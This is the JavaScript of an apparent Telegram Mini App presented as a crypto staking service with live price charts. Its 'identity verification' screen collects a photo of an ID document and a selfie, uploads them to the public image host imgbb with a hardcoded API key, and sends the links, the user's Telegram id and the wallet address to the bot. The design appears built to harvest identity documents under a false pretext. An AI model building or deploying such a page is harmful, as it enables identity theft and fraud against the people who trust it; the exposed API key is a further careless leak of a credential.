const tg = window.Telegram.WebApp;
tg.expand();

// !!! ВСТАВЬ СВОЙ КЛЮЧ НИЖЕ !!!
const IMGBB_API_KEY = 'a2973b7dd242d701ce2c0d529bcd6a72'; 

const translations = {
    ru: {
        verify_title: "Верификация личности",
        choose_photo: "Выбрать фото",
        take_photo: "Сделать фото",
        send_data: "Отправить данные",
        staking_title: "Стейкинг активов",
        wallet_placeholder: "Введите адрес кошелька",
        connect_wallet: "Подключить кошелек",
        loading: "Загрузка...",
        settings: "Настройки",
        help_support: "Помощь и поддержка",
        language: "Язык",
        privacy: "Политика конфиденциальности",
        statistics: "Статистика",
        market_cap: "Капитализация",
        circulating: "В обращении",
        volume_24h: "Объём (24 ч)",
        done: "Готово ✅"
    },
    en: {
        verify_title: "Identity Verification",
        choose_photo: "Choose Photo",
        take_photo: "Take Photo",
        send_data: "Send Data",
        staking_title: "Asset Staking",
        wallet_placeholder: "Enter wallet address",
        connect_wallet: "Connect Wallet",
        loading: "Loading...",
        settings: "Settings",
        help_support: "Help & Support",
        language: "Language",
        privacy: "Privacy Policy",
        statistics: "Statistics",
        market_cap: "Market Cap",
        circulating: "Circulating Supply",
        volume_24h: "Volume (24h)",
        done: "Done ✅"
    }
};

let currentLang = localStorage.getItem('lang') || 'ru';
let myChart = null;

// Навигация
function showScreen(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

document.getElementById('settingsBtn').onclick = () => showScreen('settingsScreen');
document.getElementById('backFromSettings').onclick = () => showScreen('mainScreen');
document.getElementById('langBtn').onclick = () => showScreen('langScreen');
document.getElementById('backFromLang').onclick = () => showScreen('settingsScreen');
document.getElementById('backFromCoin').onclick = () => showScreen('mainScreen');

// Обработка выбора фото (ПРЕВЬЮ)
function setupPreview(inputId, previewId, textId) {
    const input = document.getElementById(inputId);
    const preview = document.getElementById(previewId);
    const text = document.getElementById(textId);

    input.onchange = function() {
        const file = this.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                preview.src = e.target.result;
                preview.classList.remove('hidden');
                text.textContent = translations[currentLang].done;
            }
            reader.readAsDataURL(file);
        }
    };
}

setupPreview('docInput', 'previewDoc', 'textDoc');
setupPreview('selfieInput', 'previewSelfie', 'textSelfie');

// Отправка данных
async function sendToBot() {
    const docFile = document.getElementById('docInput').files[0];
    const selfieFile = document.getElementById('selfieInput').files[0];
    const wallet = document.getElementById('walletInput').value;

    if (!docFile || !selfieFile) {
        showStatus("❌ Загрузите оба фото");
        return;
    }

    showStatus("⏳ Загрузка...");

    try {
        const upload = async (file) => {
            const fd = new FormData();
            fd.append('image', file);
            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: fd });
            const d = await res.json();
            return d.data.url;
        };

        const url1 = await upload(docFile);
        const url2 = await upload(selfieFile);

        const result = {
            action: "verification",
            user_id: tg.initDataUnsafe?.user?.id || "unknown",
            wallet: wallet || "not_set",
            doc: url1,
            selfie: url2
        };

        tg.sendData(JSON.stringify(result));
        showStatus("✅ Отправлено!");
        setTimeout(() => tg.close(), 2000);
    } catch (e) {
        showStatus("❌ Ошибка сети");
    }
}

document.getElementById('verifyBtn').onclick = sendToBot;

// Котировки и Графики
async function getPrices() {
    try {
        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,binancecoin,solana,tron&order=market_cap_desc&sparkline=true');
        const data = await res.json();
        const list = document.getElementById('tokensList');
        list.innerHTML = '';

        data.forEach(coin => {
            const div = document.createElement('div');
            div.className = 'token-item';
            const change = coin.price_change_percentage_24h;
            div.innerHTML = `
                <div class="token-info">
                    <img src="${coin.image}" class="token-icon">
                    <div>
                        <div class="token-name">${coin.name}</div>
                        <div class="token-hint" style="font-size:12px;color:#707A8A">${coin.symbol.toUpperCase()}</div>
                    </div>
                </div>
                <div class="token-price">
                    <div>$${coin.current_price.toLocaleString()}</div>
                    <div class="${change < 0 ? 'neg' : 'pos'}">${change.toFixed(2)}%</div>
                </div>
            `;
            div.onclick = () => showCoinDetail(coin);
            list.appendChild(div);
        });
    } catch (e) { console.error(e); }
}

function showCoinDetail(coin) {
    showScreen('coinScreen');
    document.getElementById('coinName').textContent = coin.name;
    document.getElementById('coinPrice').textContent = `$${coin.current_price.toLocaleString()}`;
    document.getElementById('coinChange').textContent = `${coin.price_change_percentage_24h.toFixed(2)}%`;
    document.getElementById('coinChange').className = `coin-change ${coin.price_change_percentage_24h < 0 ? 'neg' : 'pos'}`;
    
    document.getElementById('statMcap').textContent = `$${coin.market_cap.toLocaleString()}`;
    document.getElementById('statCirc').textContent = `${coin.circulating_supply.toLocaleString()} ${coin.symbol.toUpperCase()}`;
    document.getElementById('statVol').textContent = `$${coin.total_volume.toLocaleString()}`;

    renderChart(coin.sparkline_in_7d.price, coin.price_change_percentage_24h < 0);
}

function renderChart(prices, isNeg) {
    const ctx = document.getElementById('coinChartCanvas').getContext('2d');
    if (myChart) myChart.destroy();
    myChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: prices.map((_, i) => i),
            datasets: [{
                data: prices,
                borderColor: isNeg ? '#f6465d' : '#2ebd85',
                borderWidth: 2,
                pointRadius: 0,
                fill: false,
                tension: 0.2
            }]
        },
        options: {
            responsive: true, maintainAspectRatio: false,
            plugins: { legend: { display: false } },
            scales: { x: { display: false }, y: { display: false } }
        }
    });
}

function showStatus(msg) {
    const s = document.getElementById('status');
    s.textContent = msg;
    s.classList.remove('hidden');
    setTimeout(() => s.classList.add('hidden'), 3000);
}

// Инициализация
getPrices();
setInterval(getPrices, 30000);
